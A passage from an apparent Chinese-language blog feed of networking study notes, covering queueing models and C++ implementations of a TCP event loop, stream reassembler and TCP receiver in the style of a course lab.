&#123;<br>            _tcp-&gt;<span class="hljs-built_in">outbound_writer</span>().<span class="hljs-built_in">close</span>();<br>            _outbound_shutdown = <span class="hljs-literal">true</span>;<br><br>            <span class="hljs-comment">// debugging output:</span><br>            cerr &lt;&lt; <span class="hljs-string">&quot;DEBUG: Outbound stream to &quot;</span> &lt;&lt; _datagram_adapter.<span class="hljs-built_in">config</span>().destination.<span class="hljs-built_in">to_string</span>()<br>                 &lt;&lt; <span class="hljs-string">&quot; finished (&quot;</span> &lt;&lt; _tcp.<span class="hljs-built_in">value</span>().<span class="hljs-built_in">sender</span>().<span class="hljs-built_in">sequence_numbers_in_flight</span>() &lt;&lt; <span class="hljs-string">&quot; seqno&quot;</span><br>                 &lt;&lt; (_tcp.<span class="hljs-built_in">value</span>().<span class="hljs-built_in">sender</span>().<span class="hljs-built_in">sequence_numbers_in_flight</span>() == <span class="hljs-number">1</span> ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;s&quot;</span>)<br>                 &lt;&lt; <span class="hljs-string">&quot; still in flight).\n&quot;</span>;<br>        &#125;<br><br>        _tcp-&gt;<span class="hljs-built_in">push</span>();<br>        <span class="hljs-built_in">collect_segments</span>();<br>    &#125;,<br>    [&amp;] &#123;<br>        <span class="hljs-built_in">return</span> (_tcp-&gt;<span class="hljs-built_in">active</span>()) <span class="hljs-built_in">and</span> (<span class="hljs-keyword">not</span> _outbound_shutdown)<br>               <span class="hljs-built_in">and</span> (_tcp-&gt;<span class="hljs-built_in">outbound_writer</span>().<span class="hljs-built_in">available_capacity</span>() &gt; <span class="hljs-number">0</span>);<br>    &#125;,<br>    [&amp;] &#123;<br>        _tcp-&gt;<span class="hljs-built_in">outbound_writer</span>().<span class="hljs-built_in">close</span>();<br>        _outbound_shutdown = <span class="hljs-literal">true</span>;<br>    &#125;);<br><br><span class="hljs-comment">// rule 3: read from inbound buffer into pipe</span><br>_eventloop.<span class="hljs-built_in">add_rule</span>(<br>  <span class="hljs-comment">// read</span><br>    <span class="hljs-string">&quot;read bytes from inbound stream&quot;</span>, _thread_data, Direction::Out,<br>    [&amp;] &#123;<br>        Reader &amp;inbound = _tcp-&gt;<span class="hljs-built_in">inbound_reader</span>();<br>        <span class="hljs-comment">// Write from the inbound_stream into</span><br>        <span class="hljs-comment">// the pipe, handling the possibility of a partial</span><br>        <span class="hljs-comment">// write (i.e., only pop what was actually written).</span><br>        <span class="hljs-keyword">if</span> (inbound.<span class="hljs-built_in">bytes_buffered</span>()) &#123;<br>            <span class="hljs-type">const</span> std::string_view buffer = inbound.<span class="hljs-built_in">peek</span>();<br>            <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> bytes_written = _thread_data.<span class="hljs-built_in">write</span>(buffer);<br>            inbound.<span class="hljs-built_in">pop</span>(bytes_written);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (inbound.<span class="hljs-built_in">is_finished</span>() <span class="hljs-keyword">or</span> inbound.<span class="hljs-built_in">has_error</span>()) &#123;<br>            _thread_data.<span class="hljs-built_in">shutdown</span>(SHUT_WR);<br>            _inbound_shutdown = <span class="hljs-literal">true</span>;<br><br>            <span class="hljs-comment">// debugging output:</span><br>            cerr &lt;&lt; <span class="hljs-string">&quot;DEBUG: Inbound stream from &quot;</span> &lt;&lt; _datagram_adapter.<span class="hljs-built_in">config</span>().destination.<span class="hljs-built_in">to_string</span>()<br>                 &lt;&lt; <span class="hljs-string">&quot; finished &quot;</span> &lt;&lt; (inbound.<span class="hljs-built_in">has_error</span>() ? <span class="hljs-string">&quot;with an error/reset.\n&quot;</span> : <span class="hljs-string">&quot;cleanly.\n&quot;</span>);<br>        &#125;<br>    &#125;,<br>    [&amp;] &#123;<br>        <span class="hljs-keyword">return</span> _tcp-&gt;<span class="hljs-built_in">inbound_reader</span>().<span class="hljs-built_in">bytes_buffered</span>()<br>               <span class="hljs-built_in">or</span> ((_tcp-&gt;<span class="hljs-built_in">inbound_reader</span>().<span class="hljs-built_in">is_finished</span>() <span class="hljs-keyword">or</span> _tcp-&gt;<span class="hljs-built_in">inbound_reader</span>().<span class="hljs-built_in">has_error</span>())<br>                   <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> _inbound_shutdown);<br>    &#125;);<br><br><span class="hljs-comment">// rule 4: read outbound segments from TCPConnection and send as datagrams</span><br>_eventloop.<span class="hljs-built_in">add_rule</span>(<br>  <span class="hljs-comment">// send TCP segment</span><br>    <span class="hljs-string">&quot;send TCP segment&quot;</span>, _datagram_adapter.<span class="hljs-built_in">fd</span>(), Direction::Out,<br>    [&amp;] &#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-keyword">not</span> outgoing_segments_.<span class="hljs-built_in">empty</span>()) &#123;<br>          <span class="hljs-comment">// 直接warraped in IP datagram</span><br>            _datagram_adapter.<span class="hljs-built_in">write</span>(outgoing_segments_.<span class="hljs-built_in">front</span>());<br>            outgoing_segments_.<span class="hljs-built_in">pop</span>();<br>        &#125;<br>    &#125;,<br>    [&amp;] &#123; <span class="hljs-keyword">return</span> <span class="hljs-keyword">not</span> outgoing_segments_.<span class="hljs-built_in">empty</span>(); &#125;);<br><br><br></code></pre></td></tr></table></figure><p>TCP =&gt; wrapped in IP(写入TUN设备) =&gt;socket(eventlop里对应上述规则1) =&gt; router(frame =&gt;socket(eventloop) =&gt; IP =&gt; socket(eventlop) =&gt; frame) =&gt;Internet(frame =&gt; IP =&gt; frame) =&gt; Host</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>计算机网路四</title>
    <link href="/emocoder/2023/07/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E8%B7%AF%E5%9B%9B/"/>
    <url>/emocoder/2023/07/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E8%B7%AF%E5%9B%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="简单确定性队列">简单确定性队列</h2><ul><li>Simple deterministic queue model</li><li>small packets reduce end to end delay</li><li>statistical multiplexing</li></ul><h3 id="simple-deterministic-queue-model">Simple deterministic queuemodel</h3><img src="/emocoder/2023/07/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E8%B7%AF%E5%9B%9B/image-20230729165914969.png" class=""><p><img src="/Users/bytedance/Library/Application Support/typora-user-images/image-20230729165914969.png" alt="image-20230729165914969" style="zoom:50%;" /></p><p>假设直到t时刻位置队列里累计的字节数为A(t)</p><p>假设直到t时刻位置从队列里分发的字节数为D(t)</p><p>Q(t) = A(t) - D(t),Q(t表示t时刻内，队列里的字节数，这里假设分发速率是确定不变的；</p><p>d(t): tmie spent in the queue by a a byte arriving at time t</p><p>这其实是一种简单的FIFO/FCFS队列模型（先进先出/先来先服务）：相对公平不存在饥饿问题。</p><p>看一到简单的题目：</p><h3 id="small-packets-reduce-end-to-end-delay">small packets reduce endto end delay</h3><p>不要一次性直接发送一整个message，而是打包成一个个packet，分别发送，相对延迟较小一点。</p><h3 id="statistical-multiplexing">statistical multiplexing</h3><p>多个输入共享一个路由</p><h2 id="排队模型特点">排队模型特点</h2><p>这里涉及的内容比较深，不做太多讨论，有兴趣可以看相关论文</p><p>通常情况下，packet到达的过程是一个复杂的随机过过程，相关理论称之为排队理论，有以下几个性质：</p><ol type="1"><li>Brustness increases delay</li><li>Determinism minimizes delay</li><li>Little's Result</li><li>The M/M/1 Model</li></ol><p>packet到达的分布本身并不是泊松分布，但是有些情况下，可以近似泊松分布来分析</p><h2 id="因特网和以太网里的分包交换">因特网和以太网里的分包交换</h2><h2 id="优化后的队列模型">优化后的队列模型</h2><h4 id="output-queue-cache">output queue cache</h4><h3 id="input-queue-cache">input queue cache</h3><h3 id="virtual">virtual</h3><h2 id="优先级队列模型">优先级队列模型</h2><h3 id="双队列模型">双队列模型</h3><h3 id="加权队列模型">加权队列模型</h3>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/emocoder/2023/07/16/Resembler/"/>
    <url>/emocoder/2023/07/16/Resembler/</url>
    
    <content type="html"><![CDATA[<h2 id="resembler">Resembler</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><code class="hljs C++"><br><span class="hljs-comment">// 当前进党设置了closed标识位且待重组的字节为0</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Reassembler::is_closed</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> closed_ &amp;&amp; <span class="hljs-built_in">bytes_pending</span>() == <span class="hljs-number">0</span>; &#125;   <br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Reassembler::insert</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> first_index, string data, <span class="hljs-type">bool</span> is_last_substring, Writer &amp;output)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (is_last_substring) &#123;<br>        closed_ = <span class="hljs-literal">true</span>;<br>    &#125;<br>待处理的超出可容纳范围 || Data have been transferred || data为空 || 可用capacity为<span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span> (first_index &gt;= unassembled_index_ + output.<span class="hljs-built_in">available_capacity</span>() || <span class="hljs-comment">/* Out of bound */</span><br>        first_index + data.<span class="hljs-built_in">length</span>() - <span class="hljs-number">1</span> &lt; unassembled_index_ ||            <span class="hljs-comment">/* Data have been transferred */</span><br>        data.<span class="hljs-built_in">empty</span>() || output.<span class="hljs-built_in">available_capacity</span>() == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">is_closed</span>()) &#123;<br>            output.<span class="hljs-built_in">close</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> cap = output.<span class="hljs-built_in">available_capacity</span>();<br>    <span class="hljs-comment">// new_index actually distinguish where the current data start, the start index</span><br>    <span class="hljs-type">uint64_t</span> new_index = first_index;<br>    <br>    <span class="hljs-comment">// Data needs to fit the capability limitation</span><br>    <span class="hljs-keyword">if</span> (first_index &lt;= unassembled_index_) &#123;<br>        <span class="hljs-comment">// 有重复</span><br>        new_index = unassembled_index_;<br>        <span class="hljs-comment">// overlapped_length = 70 - 60;</span><br>        <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> overlapped_length = unassembled_index_ - first_index;<br>        <span class="hljs-comment">// substr(10, 20 - 10); data.size = [60, 80] =&gt; [0, 20]</span><br>        data = data.<span class="hljs-built_in">substr</span>(overlapped_length, <span class="hljs-built_in">min</span>(data.<span class="hljs-built_in">size</span>() - overlapped_length, cap));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 没有重复</span><br>        <span class="hljs-comment">// get 全部数据or可容纳的部分</span><br>        data = data.<span class="hljs-built_in">substr</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">min</span>(data.<span class="hljs-built_in">size</span>(), cap));<br>        <span class="hljs-keyword">if</span> (first_index + data.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span> &gt; unassembled_index_ + cap - <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-comment">// </span><br>            data = data.<span class="hljs-built_in">substr</span>(<span class="hljs-number">0</span>, unassembled_index_ + cap - first_index);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 主要是处理 unassembled_substrings_ 和</span><br>    <span class="hljs-comment">// 获取 &gt;=new_index的最小索引</span><br>    <span class="hljs-keyword">auto</span> rear_iter = unassembled_substrings_.<span class="hljs-built_in">lower_bound</span>(new_index);<br>    <span class="hljs-keyword">while</span> (rear_iter != unassembled_substrings_.<span class="hljs-built_in">end</span>()) &#123;<br>        <span class="hljs-keyword">auto</span> &amp;[rear_index, rear_data] = *rear_iter;<br>        <span class="hljs-comment">// 和rear_index没有重叠</span><br>        <span class="hljs-keyword">if</span> (new_index + data.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span> &lt; rear_index) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125; <span class="hljs-comment">// No overlap conflict</span><br>        <br>        <span class="hljs-comment">// 否则就是有重叠</span><br>        <span class="hljs-type">uint64_t</span> rear_overlapped_length = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (new_index + data.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span> &lt; rear_index + rear_data.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-comment">// the last index of current data less than counterpart of the rear_data</span><br>            <span class="hljs-comment">// denote that current: [. [  ]. ], then cut from [new_index, new_index + overlap_len]，这种case新的或者旧的应该包含重叠部分，这里采用的是旧的包含重叠部分，新的不包含重叠部分</span><br>            rear_overlapped_length = new_index + data.<span class="hljs-built_in">size</span>() - rear_index;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// else current: [. [  ] ]. 这种case旧的substring就不应该需要了，新的替换</span><br>            rear_overlapped_length = rear_data.<span class="hljs-built_in">size</span>();<br>        &#125;<br>        <span class="hljs-comment">// Prepare for next rear early, because the data may be erased afterwards.</span><br>        <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> next_rear = rear_index + rear_data.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; <span class="hljs-comment">// last index of rear_data</span><br>        <span class="hljs-keyword">if</span> (rear_overlapped_length == rear_data.<span class="hljs-built_in">size</span>()) &#123;<br>          <span class="hljs-comment">// 走了上面的else，就会走这里</span><br>            unassembled_bytes_ -= rear_data.<span class="hljs-built_in">size</span>();<br>            unassembled_substrings_.<span class="hljs-built_in">erase</span>(rear_index); <span class="hljs-comment">// 抹除旧的</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-comment">// 走了上面的if，就会走这里</span><br>            <span class="hljs-comment">// We don&#x27;t combine current data and rear data.</span><br>            <span class="hljs-comment">// Erase the overlapped part in current data is more efficient.</span><br>            data.<span class="hljs-built_in">erase</span>(data.<span class="hljs-built_in">end</span>() - <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">int64_t</span>&gt;(rear_overlapped_length), data.<span class="hljs-built_in">end</span>());<br>        &#125;<br>        <span class="hljs-comment">// 寻找下一个 &gt;= next_rear的substring</span><br>        rear_iter = unassembled_substrings_.<span class="hljs-built_in">lower_bound</span>(next_rear);<br>    &#125;<br>    <br>     <span class="hljs-comment">// 同样地主要是处理 unassembled_substrings_ 和最大索引</span><br>     <span class="hljs-comment">// if the current substring behind the unassembled_index_</span><br>     <span class="hljs-keyword">if</span> (first_index &gt; unassembled_index_) &#123;<br>        <span class="hljs-comment">// 获取&gt;new_index的最小值</span><br>        <span class="hljs-keyword">auto</span> front_iter = unassembled_substrings_.<span class="hljs-built_in">upper_bound</span>(new_index);<br>        <span class="hljs-keyword">if</span> (front_iter != unassembled_substrings_.<span class="hljs-built_in">begin</span>()) &#123;<br>            <span class="hljs-comment">// 递减front_iter</span><br>            front_iter--;<br>            <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;[front_index, front_data] = *front_iter;<br>            <span class="hljs-comment">// if first_index, ]</span><br>            <span class="hljs-keyword">if</span> (front_index + front_data.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span> &gt;= first_index) &#123;<br>                <span class="hljs-type">uint64_t</span> overlapped_length = <span class="hljs-number">0</span>;<br>                <span class="hljs-comment">// if  ] last_index</span><br>                <span class="hljs-keyword">if</span> (front_index + front_data.<span class="hljs-built_in">size</span>() &lt;= first_index + data.<span class="hljs-built_in">size</span>()) &#123;<br>                   <span class="hljs-comment">// 一次性把之前的全部delete了，所以不需要遍历</span><br>                    overlapped_length = front_index + front_data.<span class="hljs-built_in">size</span>() - first_index;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment">// if  last_index  ]</span><br>                    overlapped_length = data.<span class="hljs-built_in">size</span>();<br>                &#125;<br>                <span class="hljs-keyword">if</span> (overlapped_length == front_data.<span class="hljs-built_in">size</span>()) &#123;<br>                    unassembled_bytes_ -= front_data.<span class="hljs-built_in">size</span>();<br>                    unassembled_substrings_.<span class="hljs-built_in">erase</span>(front_index);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    data.<span class="hljs-built_in">erase</span>(data.<span class="hljs-built_in">begin</span>(), data.<span class="hljs-built_in">begin</span>() + <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">int64_t</span>&gt;(overlapped_length));<br>                    <span class="hljs-comment">// Don&#x27;t forget to update the inserted location</span><br>                    new_index = first_index + overlapped_length;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <br>    <br>    <span class="hljs-comment">// If the processed data is empty, no need to insert it.</span><br>    <span class="hljs-keyword">if</span> (data.<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">0</span>) &#123;<br>        unassembled_bytes_ += data.<span class="hljs-built_in">size</span>();<br>        unassembled_substrings_.<span class="hljs-built_in">insert</span>(<span class="hljs-built_in">make_pair</span>(new_index, std::<span class="hljs-built_in">move</span>(data)));<br>    &#125;<br><br> <span class="hljs-comment">// 从unassembled_strings中取出合理的（这里的合理指有序取，所以顺序遍历从unassembled_strings中取和上一层未组装的地方）插入发送缓冲区</span><br>   <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> iter = unassembled_substrings_.<span class="hljs-built_in">begin</span>(); iter != unassembled_substrings_.<span class="hljs-built_in">end</span>();) &#123;<br>        <span class="hljs-keyword">auto</span> &amp;[sub_index, sub_data] = *iter;<br>        <span class="hljs-keyword">if</span> (sub_index == unassembled_index_) &#123;<br>          <span class="hljs-comment">// 找到了</span><br>            <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> prev_bytes_pushed = output.<span class="hljs-built_in">bytes_pushed</span>();<br>            output.<span class="hljs-built_in">push</span>(sub_data);<br>            <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> bytes_pushed = output.<span class="hljs-built_in">bytes_pushed</span>();<br>            <span class="hljs-comment">// 但是可能装不下</span><br>            <span class="hljs-comment">// which case can go this if condition path ? when the Writer has no available space to store data.</span><br>            <span class="hljs-keyword">if</span> (bytes_pushed != prev_bytes_pushed + sub_data.<span class="hljs-built_in">size</span>()) &#123;<br>                <span class="hljs-comment">// Cannot push all data, we need to reserve the un-pushed part.</span><br>                <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> pushed_length = bytes_pushed - prev_bytes_pushed;<br>               <span class="hljs-comment">// 已经装进去的 </span><br>                unassembled_index_ += pushed_length;<br>               <span class="hljs-comment">// 未装进去的</span><br>                unassembled_bytes_ -= pushed_length;<br>               <span class="hljs-comment">// 把没有装进去的放回缓存区（unassembled_substrings_）</span><br>                unassembled_substrings_.<span class="hljs-built_in">insert</span>(<span class="hljs-built_in">make_pair</span>(unassembled_index_, sub_data.<span class="hljs-built_in">substr</span>(pushed_length)));<br>                <span class="hljs-comment">// Don&#x27;t forget to remove the previous incompletely transferred data</span><br>                unassembled_substrings_.<span class="hljs-built_in">erase</span>(sub_index);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            unassembled_index_ += sub_data.<span class="hljs-built_in">size</span>();<br>            unassembled_bytes_ -= sub_data.<span class="hljs-built_in">size</span>();<br>            unassembled_substrings_.<span class="hljs-built_in">erase</span>(sub_index);<br>            iter = unassembled_substrings_.<span class="hljs-built_in">find</span>(unassembled_index_);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">break</span>; <span class="hljs-comment">// No need to do more. Data has been discontinuous.</span><br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">is_closed</span>()) &#123;<br>        <span class="hljs-comment">// if it is the last substring and bytes_pending === 0, then close</span><br>        output.<span class="hljs-built_in">close</span>();<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="tcpreceiver">TCPReceiver</h2><p>这一节最好合上一节来看</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;tcp_receiver.hh&quot;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TCPReceiver::receive</span><span class="hljs-params">(TCPSenderMessage message, Reassembler &amp;reassembler, Writer &amp;inbound_stream)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-comment">// 没有设置SYN，此时不应该接受数据</span><br>    <span class="hljs-keyword">if</span> (!set_syn_) &#123;<br>      <span class="hljs-comment">// 且当前报道文也不是SYN的</span><br>        <span class="hljs-keyword">if</span> (!message.SYN) &#123;<br>            <span class="hljs-keyword">return</span>; <span class="hljs-comment">// drop all data if SYN isn&#x27;t received</span><br>        &#125;<br>        <span class="hljs-comment">// 当前报道文是SYN的，设置ISN：随机的32位数字</span><br>        isn_ = message.seqno; <span class="hljs-comment">// FIN occupied one seqno</span><br>        set_syn_ = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 设置SYN标志位</span><br>    &#125;<br><br>    <span class="hljs-comment">// inbound_stream.bytes_pushed()即unassembled_index, + 1即为下一个期待接入的序号（first_index），需要基于ISN转为abs_seqno =&gt; stram_index</span><br>    <span class="hljs-comment">// stream_index = abs_seqno - 1 + SYN</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> checkpoint = inbound_stream.<span class="hljs-built_in">bytes_pushed</span>() + <span class="hljs-number">1</span>;<br>    <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> abs_seqno = message.seqno.<span class="hljs-built_in">unwrap</span>(isn_, checkpoint);<br>    <span class="hljs-comment">// unwrap function starts from isn_, which occupies one seqno.</span><br>    <span class="hljs-comment">// We calculate one index more so we need to minus it.</span><br>    <span class="hljs-comment">// But if SYN exists in this message, compensation is needed.</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> stream_index = abs_seqno - <span class="hljs-number">1</span> + message.SYN;<br>    <span class="hljs-comment">// 调用上一节实现的insert方法</span><br>    reassembler.<span class="hljs-built_in">insert</span>(stream_index, message.payload.<span class="hljs-built_in">release</span>(), message.FIN, inbound_stream);<br>&#125;<br><br><span class="hljs-comment">// receive调用结束了之后调用</span><br><span class="hljs-function">TCPReceiverMessage <span class="hljs-title">TCPReceiver::send</span><span class="hljs-params">(<span class="hljs-type">const</span> Writer &amp;inbound_stream)</span> <span class="hljs-type">const</span></span><br><span class="hljs-function"></span>&#123;<br>    TCPReceiverMessage recv_msg &#123;&#125;;<br><br>    <span class="hljs-comment">// ws为接受方的缓存里的available_capacity，</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">uint16_t</span> window_size<br>        = inbound_stream.<span class="hljs-built_in">available_capacity</span>() &gt; UINT16_MAX ? UINT16_MAX : inbound_stream.<span class="hljs-built_in">available_capacity</span>();<br>    <span class="hljs-keyword">if</span> (!set_syn_) &#123;<br>        <span class="hljs-keyword">return</span> &#123;std::optional&lt;Wrap32&gt; &#123;&#125;, window_size&#125;;<br>    &#125;<br>    <span class="hljs-comment">// add one ISN(SYN) length，ackno为下一个期待的序列号</span><br>    <span class="hljs-type">uint64_t</span> abs_ackno_offset = inbound_stream.<span class="hljs-built_in">bytes_pushed</span>() + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (inbound_stream.<span class="hljs-built_in">is_closed</span>()) &#123;<br>        abs_ackno_offset++; <span class="hljs-comment">// add one FIN</span><br>    &#125;<br>    recv_msg.ackno = isn_ + abs_ackno_offset;<br>    recv_msg.window_size = window_size;<br><br>    <span class="hljs-keyword">return</span> recv_msg;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>绝对序列号是为了不让别人轻易猜到，但是为什么用32位？</li><li>为什么<code>const uint64_t stream_index = abs_seqno - 1 + message.SYN;</code></li></ul><h2 id="tcpsender">TCPSender</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 